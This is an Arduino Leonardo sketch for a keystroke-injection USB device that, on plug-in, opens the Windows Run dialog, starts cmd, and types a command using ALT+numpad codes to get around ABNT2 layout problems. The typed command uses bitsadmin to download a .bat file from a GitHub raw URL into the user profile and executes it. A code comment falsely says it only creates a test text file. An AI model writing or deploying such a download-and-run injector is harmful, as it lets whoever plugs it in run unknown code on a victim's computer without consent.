#include <Keyboard.h>

/*
  Windows command automation for Arduino Leonardo / ATmega32u4.

  Why this version exists:
  - The standard Arduino Keyboard.print()/Keyboard.write() translation is US-layout oriented.
  - Sending raw HID positions also does NOT make printable characters layout-independent.
    Windows still converts the physical key position according to the active layout.
  - On ABNT2 this causes classic mismatches such as:
      / -> ;
      : -> Ç
      \ -> ]
      " -> ^

  Strategy:
  - Use raw HID only for layout-stable control keys and for opening Win+R / typing "cmd".
  - Once cmd.exe is open, type the actual command using Windows ALT+numpad ASCII codes.
    ALT+numpad input is much more reliable for symbols under ABNT2 because it asks
    Windows for a character code instead of relying on the keyboard layout.

  Notes:
  - This is intentionally slower than Keyboard.print(), but it avoids ABNT2 symbol drift.
  - Keep the command ASCII-only unless you extend typeAsciiChar().
*/

#include <stdint.h>

#define RAW(hid) ((uint8_t)(0x88 + (hid)))  // Arduino Keyboard raw HID code for usage <= 0x77

// HID usage IDs for numpad digits.
const uint8_t KP_DIGITS[10] = {
  0x62, // keypad 0
  0x59, // keypad 1
  0x5A, // keypad 2
  0x5B, // keypad 3
  0x5C, // keypad 4
  0x5D, // keypad 5
  0x5E, // keypad 6
  0x5F, // keypad 7
  0x60, // keypad 8
  0x61  // keypad 9
};

void tapRaw(uint8_t hid, uint16_t holdMs = 8, uint16_t gapMs = 8) {
  Keyboard.press(RAW(hid));
  delay(holdMs);
  Keyboard.releaseAll();
  delay(gapMs);
}

void typeLetterLowercase(char c) {
  // Only for a-z. These physical positions are stable enough for "cmd" on ABNT2.
  if (c < 'a' || c > 'z') return;
  tapRaw(0x04 + (c - 'a'));
}

void typeSimpleAsciiForRunDialog(const char *s) {
  // Safe for "cmd" and similar plain alphabetic launcher commands.
  while (*s) {
    char c = *s++;
    if (c >= 'a' && c <= 'z') {
      typeLetterLowercase(c);
    } else if (c >= 'A' && c <= 'Z') {
      Keyboard.press(KEY_LEFT_SHIFT);
      tapRaw(0x04 + (c - 'A'));
      Keyboard.releaseAll();
    } else if (c == ' ') {
      tapRaw(0x2C);
    }
  }
}

void tapKeypadDigit(uint8_t digit) {
  if (digit > 9) return;
  Keyboard.press(RAW(KP_DIGITS[digit]));
  delay(8);
  Keyboard.release(RAW(KP_DIGITS[digit]));
  delay(8);
}

void typeAsciiChar(char c) {
  uint8_t code = (uint8_t)c;

  // Limit to printable 7-bit ASCII plus CR/LF handling through KEY_RETURN.
  if (code < 32 || code > 126) return;

  /*
    Use ALT+0NNN. The leading zero asks Windows for the ANSI/Windows character
    code path. For printable ASCII 032-126 this gives the expected characters:
    %, &, ", :, /, \, >, etc.
  */
  Keyboard.press(KEY_LEFT_ALT);
  delay(15);

  tapKeypadDigit(0);
  tapKeypadDigit((code / 100) % 10);
  tapKeypadDigit((code / 10) % 10);
  tapKeypadDigit(code % 10);

  delay(15);
  Keyboard.release(KEY_LEFT_ALT);
  delay(20);
}

void typeAsciiString(const char *s) {
  while (*s) {
    typeAsciiChar(*s++);
  }
}

void openRunDialog() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(RAW(0x15)); // HID 0x15 = physical R key
  delay(120);
  Keyboard.releaseAll();
  delay(900);
}

void setup() {
  Keyboard.begin();

  // Wait for Windows to enumerate the device.
  delay(5000);

  openRunDialog();

  // "cmd" is safe to type as physical letters on ABNT2.
  typeSimpleAsciiForRunDialog("cmd");
  Keyboard.write(KEY_RETURN);

  delay(1500);

  /*
    Edit your command here.

    This test creates:
      %USERPROFILE%\Downloads\arduino_test.txt

    Symbols such as %, \, > and & are typed through ALT+numpad ASCII codes,
    not through ABNT2 key positions.
  */
  const char *command =
    "cmd /c \"bitsadmin /transfer job /download /priority high https://raw.githubusercontent.com/rf-peixoto/Studies/2f763cdb0bcb189b4b33261686734ac56cd61939/Code/PowerShell/t.bat %userprofile%\\x.bat && %userprofile%\\x.bat\" && exit";

  typeAsciiString(command);
  Keyboard.write(KEY_RETURN);

  Keyboard.end();
}

void loop() {}
